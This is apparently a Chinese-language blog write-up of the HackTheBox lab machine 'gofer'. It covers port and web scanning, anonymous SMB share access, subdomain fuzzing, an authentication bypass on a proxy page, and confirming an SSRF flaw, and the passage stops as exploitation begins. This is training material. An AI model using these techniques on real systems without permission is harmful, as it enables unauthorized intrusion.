<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[HTB]  gofer | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB]  gofer</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-08-05T15:01:15.105Z" id="date"> 2023-08-05</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-08-05T15:04:20.463Z" id="updated"> 2023-08-05</time></div></span><br><span>Word Count: <div class="control">5.9k</div></span><br><span>Read Time: <div class="control">31 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/96848020b3fdeb25420182fab6f76b9012342800.jpg'><img src="/pic/96848020b3fdeb25420182fab6f76b9012342800.jpg" alt="96848020b3fdeb25420182fab6f76b9012342800"></p>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>懒得写了。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nmap -p- --min-rate=10000 10.10.11.225<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 02:22 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.225<br>Host is up (0.075s latency).<br>Not shown: 65530 closed tcp ports (reset)<br>PORT    STATE    SERVICE<br>22/tcp  open     ssh<br>25/tcp  filtered smtp<br>80/tcp  open     http<br>139/tcp open     netbios-ssn<br>445/tcp open     microsoft-ds<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.06 seconds<br><br>$ sudo nmap -sT -sV -sC -O -p22,25,80,139,445 10.10.11.225<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 02:24 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.225<br>Host is up (0.074s latency).<br><br>PORT    STATE    SERVICE     VERSION<br>22/tcp  open     ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)<br>| ssh-hostkey:<br>|   3072 aa:25:82:6e:b8:04:b6:a9:a9:5e:1a:91:f0:94:51:<span class="hljs-built_in">dd</span> (RSA)<br>|   256 18:21:ba:a7:dc:e4:4f:60:d7:81:03:9a:5d:c2:e5:96 (ECDSA)<br>|_  256 a4:2d:0d:45:13:2a:9e:7f:86:7a:f6:f7:78:bc:42:d9 (ED25519)<br>25/tcp  filtered smtp<br>80/tcp  open     http        Apache httpd 2.4.56<br>|_http-title: Did not follow redirect to http://gofer.htb/<br>|_http-server-header: Apache/2.4.56 (Debian)<br>139/tcp open     netbios-ssn Samba smbd 4.6.2<br>445/tcp open     netbios-ssn Samba smbd 4.6.2<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1<br>Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linnux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS (93%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>| smb2-time:<br>|   <span class="hljs-built_in">date</span>: 2023-08-04T06:24:34<br>|_  start_date: N/A<br>|_nbstat: NetBIOS name: GOFER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| smb2-security-mode:<br>|   3:1:1:<br>|_    Message signing enabled but not required<br>|_clock-skew: 10s<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.or<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 27.81 seconds<br><br>$ sudo nmap --script=vuln 10.10.11.225<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-04 02:26 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos:<br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> gofer.htb (10.10.11.225)<br>Host is up (0.078s latency).<br>Not shown: 995 closed tcp ports (reset)<br>PORT    STATE    SERVICE<br>22/tcp  open     ssh<br>25/tcp  filtered smtp<br>80/tcp  open     http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-fileupload-exploiter:</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Couldn&#x27;</span>t find a file-type field.<br>|<br>|_    Couldn<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">| http-csrf:</span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=gofer.htb</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities:</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Path: http://gofer.htb:80/</span><br><span class="hljs-string">|     Form id:</span><br><span class="hljs-string">|     Form action:</span><br><span class="hljs-string">|</span><br><span class="hljs-string">|     Path: http://gofer.htb:80/index.html</span><br><span class="hljs-string">|     Form id:</span><br><span class="hljs-string">|_    Form action:</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>139/tcp open     netbios-ssn<br>445/tcp open     microsoft-ds<br><br>Host script results:<br>|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less datsing); aborting [9]<br>|_smb-vuln-ms10-054: <span class="hljs-literal">false</span><br>|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned lare missing); aborting [9]<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 89.27 seconds<br></code></pre></td></tr></table></figure>

<p>25端口被filter了，可能是防火墙啥的。80开着可以看看，139和445的smb服务肯定是第一个要看的。那么大体路径就是这样了。</p>
<h3 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo whatweb 10.10.11.225<br>[sudo] password <span class="hljs-keyword">for</span> meamea:<br>http://10.10.11.225 [301 Moved Permanently] Apache[2.4.56], Country[RESERVED][ZZ], HTTPSer1.225], RedirectLocation[http://gofer.htb/], Title[301 Moved Permanently]<br>ERROR Opening: http://gofer.htb/ - no address <span class="hljs-keyword">for</span> gofer.htb<br><br>$ sudo vim /etc/hosts<br><br>$ sudo whatweb http://gofer.htb<br>http://gofer.htb [200 OK] Apache[2.4.56], Bootstrap, Country[RESERVED][ZZ], Email[info@gofe/2.4.56 (Debian)], IP[10.10.11.225], Lightbox, Script, Title[Gofer]<br></code></pre></td></tr></table></figure>

<p>我们把域名加到hosts里面。</p>
<h3 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nikto -h http://gofer.htb<br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          10.10.11.225<br>+ Target Hostname:    gofer.htb<br>+ Target Port:        80<br>+ Start Time:         2023-08-04 02:26:53 (GMT-4)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.56 (Debian)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.ms<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to rendthe MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/m<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ /: Server may leak inodes via ETags, header found with file /, inode: 72c4, size: 5fa663in/cvename.cgi?name=CVE-2003-1418<br>+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .<br>+ 7962 requests: 0 error(s) and 4 item(s) reported on remote host<br>+ End Time:           2023-08-04 02:37:23 (GMT-4) (630 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>

<p>没啥信息。</p>
<h2 id="smb渗透"><a href="#smb渗透" class="headerlink" title="smb渗透"></a>smb渗透</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbmap -H 10.10.11.225<br>[+] IP: 10.10.11.225:445        Name: gofer.htb<br>        Disk             Permissions     Comment<br>        ----             -----------     -------<br>        <span class="hljs-built_in">print</span>$           NO ACCESS       Printer Drivers<br>        shares           READ ONLY<br>        IPC$             NO ACCESS       IPC Service (Samba 4.13.13-Debian)<br></code></pre></td></tr></table></figure>

<p>smbmap先扫一下都共享了哪些目录以及哪些目录是可以访问的。我们发现shares可以读，我们直接连接看看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient \\\\10.10.11.225\\shares<br>Password <span class="hljs-keyword">for</span> [WORKGROUP\me]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Fri Oct 28 15:32:08 2022<br>  ..                                  D        0  Fri Apr 28 07:59:34 2023<br>  .backup                            DH        0  Thu Apr 27 08:49:32 2023<br><br>                5061888 blocks of size 1024. 2164028 blocks available<br>smb: \&gt; <span class="hljs-built_in">cd</span> .backup\<br>smb: \.backup\&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Thu Apr 27 08:49:32 2023<br>  ..                                  D        0  Fri Oct 28 15:32:08 2022<br>  mail                                N     1101  Thu Apr 27 08:49:32 2023<br><br>                5061888 blocks of size 1024. 2164008 blocks available<br>smb: \.backup\&gt; get mail<br>getting file \.backup\mail of size 1101 as mail (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)<br>smb: \.backup\&gt; <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>

<p>我们发现有封邮件，直接下载下来看看内容。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022<br>Return-Path: &lt;jdavis@gofer.htb&gt;<br>X-Original-To: tbuckley@gofer.htb<br>Delivered-To: tbuckley@gofer.htb<br>Received: from gofer.htb (localhost [127.0.0.1])<br>        by gofer.htb (Postfix) with SMTP id C8F7461827<br>        for &lt;tbuckley@gofer.htb&gt;; Fri, 28 Oct 2022 20:28:43 +0100 (BST)<br>Subject:Important to read!<br>Message-Id: &lt;20221028192857.C8F7461827@gofer.htb&gt;<br>Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)<br>From: jdavis@gofer.htb<br><br>Hello guys,<br><br>Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. From  now on, I&#x27;ve decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt forma saved in Office Word are not always well interpreted by Libreoffice.<br><br>PS: Last thing for Tom; I know you&#x27;re working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seet should be possible to do so via &lt;Limit&gt;<br><br></code></pre></td></tr></table></figure>

<p>省流一下，邮件主要有几个值得注意的点：</p>
<ol>
<li>Jocelyn最近又收到了钓鱼邮件，并且她（我就是要假定性别）有喜欢乱点链接的习惯。</li>
<li>之后在内部传文件会用邮件传并且最好要求是<code>.odt</code>格式的文件</li>
<li>Tom正在搞网页代理，并且他的访问限制可能做的不是特别严格。</li>
<li>邮件中的名字都有可能是用户名，可以留意一下，例如<code>tbuckley、jdavis、Jocelyn、Tom</code>。</li>
</ol>
<p>其中第3条的网页代理提示我们可能存在子域名，其他信息目前还不知道有没有用，接着看吧。</p>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><h3 id="访问网站"><a href="#访问网站" class="headerlink" title="访问网站"></a>访问网站</h3><p class='item-img' data-src='/pic/assets/db9d96c1f276bda77d23b06a9a9708f4.png'><img src="/pic/assets/db9d96c1f276bda77d23b06a9a9708f4.png" alt="db9d96c1f276bda77d23b06a9a9708f4"></p>
<p>进网页看了一圈也没啥有用的。那就目录扫描和FUZZ一下子域名看看。</p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo feroxbuster -u http://gofer.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x odt -n<br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.10.0<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://gofer.htb<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br> 👌  Status Codes          │ All Status Codes!<br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.10.0<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🔎  Extract Links         │ <span class="hljs-literal">true</span><br> 💲  Extensions            │ [odt]<br> 🏁  HTTP methods          │ [GET]<br> 🚫  Do Not Recurse        │ <span class="hljs-literal">true</span><br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>404      GET        9l       31w      271c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter<br>403      GET        9l       28w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter<br>200      GET       81l      197w     2590c http://gofer.htb/assets/vendor/php-email-form/validate.js<br>200      GET        7l       27w     3309c http://gofer.htb/assets/img/apple-touch-icon.png<br>200      GET      621l     2087w    29380c http://gofer.htb/index.html<br>200      GET      237l      526w     5700c http://gofer.htb/assets/js/main.js<br>200      GET        9l       23w      847c http://gofer.htb/assets/img/favicon.png<br>200      GET       90l      527w    40608c http://gofer.htb/assets/img/testimonials/testimonials-5.jpg<br>200      GET      130l      463w    27174c http://gofer.htb/assets/img/portfolio/portfolio-8.jpg<br>200      GET        1l      233w    13749c http://gofer.htb/assets/vendor/glightbox/css/glightbox.min.css<br>200      GET       88l      408w    36465c http://gofer.htb/assets/img/testimonials/testimonials-4.jpg<br>200      GET       13l      171w    16468c http://gofer.htb/assets/vendor/swiper/swiper-bundle.min.css<br>200      GET      261l     1188w    94694c http://gofer.htb/assets/img/about-img.jpg<br>200      GET      259l     1656w   147504c http://gofer.htb/assets/img/portfolio/portfolio-5.jpg<br>200      GET      187l      991w    87460c http://gofer.htb/assets/img/team/team-4.jpg<br>200      GET        1l      133w    68028c http://gofer.htb/assets/vendor/boxicons/css/boxicons.min.css<br>200      GET      369l     2025w   164200c http://gofer.htb/assets/img/team/team-2.jpg<br>200      GET      147l      628w    44741c http://gofer.htb/assets/img/portfolio/portfolio-6.jpg<br>200      GET     1535l     3031w    26660c http://gofer.htb/assets/css/style.css<br>200      GET       14l     1684w   143629c http://gofer.htb/assets/vendor/swiper/swiper-bundle.min.js<br>200      GET        1l      313w    14690c http://gofer.htb/assets/vendor/aos/aos.js<br>301      GET        9l       28w      307c http://gofer.htb/assets =&gt; http://gofer.htb/assets/<br>200      GET      160l      818w    71959c http://gofer.htb/assets/img/testimonials/testimonials-1.jpg<br>200      GET        1l      625w    55880c http://gofer.htb/assets/vendor/glightbox/js/glightbox.min.js<br>200      GET      148l      914w    83895c http://gofer.htb/assets/img/portfolio/portfolio-2.jpg<br>200      GET      246l     1284w   100163c http://gofer.htb/assets/img/portfolio/portfolio-3.jpg<br>200      GET      345l     1897w   135739c http://gofer.htb/assets/img/portfolio/portfolio-1.jpg<br>200      GET        7l     2189w   194901c http://gofer.htb/assets/vendor/bootstrap/css/bootstrap.min.css<br>200      GET      316l     1853w   153340c http://gofer.htb/assets/img/team/team-1.jpg<br>200      GET      247l     1374w    99927c http://gofer.htb/assets/img/team/team-3.jpg<br>200      GET       71l      380w    30729c http://gofer.htb/assets/img/testimonials/testimonials-3.jpg<br>200      GET        1l      218w    26053c http://gofer.htb/assets/vendor/aos/aos.css<br>200      GET      488l     2828w   220492c http://gofer.htb/assets/img/portfolio/portfolio-7.jpg<br>200      GET      244l     1332w   103224c http://gofer.htb/assets/img/testimonials/testimonials-2.jpg<br>200      GET      120l      567w    48988c http://gofer.htb/assets/img/portfolio/portfolio-4.jpg<br>200      GET       12l      557w    35445c http://gofer.htb/assets/vendor/isotope-layout/isotope.pkgd.min.js<br>200      GET     1876l     9310w    88585c http://gofer.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css<br>200      GET      238l     1343w   105633c http://gofer.htb/assets/img/portfolio/portfolio-9.jpg<br>200      GET        7l     1223w    80496c http://gofer.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js<br>200      GET      621l     2087w    29380c http://gofer.htb/<br>[<span class="hljs-comment">####################] - 12m   220605/220605  0s      found:38      errors:7</span><br>[<span class="hljs-comment">####################] - 12m   220546/220546  318/s   http://gofer.htb/</span><br></code></pre></td></tr></table></figure>

<p>没发现啥有用的。</p>
<h3 id="子域名FUZZ"><a href="#子域名FUZZ" class="headerlink" title="子域名FUZZ"></a>子域名FUZZ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ wfuzz -H <span class="hljs-string">&quot;Host: FUZZ.gofer.htb&quot;</span> --hc 404,403 --hw 28 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://gofer.htb<br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: http://gofer.htb/</span><br><span class="hljs-string">Total requests: 4989</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload</span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">000000084:   401        14 L     54 W       462 Ch      &quot;proxy&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">Total time: 40.14814</span><br><span class="hljs-string">Processed Requests: 4989</span><br><span class="hljs-string">Filtered Requests: 4988</span><br><span class="hljs-string">Requests/sec.: 124.2647</span><br></code></pre></td></tr></table></figure>

<p>这个<code>proxy</code>多半就是tom弄的网页代理了，我们把它加入hosts后再访问。</p>
<h3 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h3><p>访问一下看看。</p>
<p class='item-img' data-src='/pic/assets/32c53ba8b4763d2b58bfc4e4ece9ad57.png'><img src="/pic/assets/32c53ba8b4763d2b58bfc4e4ece9ad57.png" alt="32c53ba8b4763d2b58bfc4e4ece9ad57"></p>
<p>上来就让我们登录，简单用之前发现的用户名尝试一下弱密码，都没成功。想起之前邮件提到说访问限制做的不好。访问限制做的不好很可能导致马奇诺防线，意思是可能只针对一种请求方式做了严格限制，对其他的请求方式没做限制。</p>
<p>我们试试其他请求方式看看。</p>
<p class='item-img' data-src='/pic/assets/62511d1220a36ace7045fd4ccf05aecc.png'><img src="/pic/assets/62511d1220a36ace7045fd4ccf05aecc.png" alt="62511d1220a36ace7045fd4ccf05aecc"></p>
<p>然而全都报了401未授权，我们再试试直接访问页面试试，我们通过<code>wappalyzer</code>发现网站使用php写的。</p>
<p class='item-img' data-src='/pic/assets/fc965d29477d4d9ced95a1dd6a716d10.png'><img src="/pic/assets/fc965d29477d4d9ced95a1dd6a716d10.png" alt="fc965d29477d4d9ced95a1dd6a716d10"></p>
<p>那我们访问index.php默认页面试试。</p>
<p class='item-img' data-src='/pic/assets/e85620fa7283cd33e1a04fe76ca8e20a.png'><img src="/pic/assets/e85620fa7283cd33e1a04fe76ca8e20a.png" alt="e85620fa7283cd33e1a04fe76ca8e20a"></p>
<p>果然，报200了，绕过授权了，但是提示确实URL参数，我们加上试试看。</p>
<p>我们直接尝试<code>http://proxy.gofer.htb/index.php?url=127.0.0.1</code></p>
<p>好家伙，直接返回了80端口的web主页，得，妥妥的SSRF漏洞。</p>
<h3 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h3><p>既然已经验证<code>ssrf</code>存在，我们直接上手利用,用curl其实比较方便，继续用火狐也行。</p>
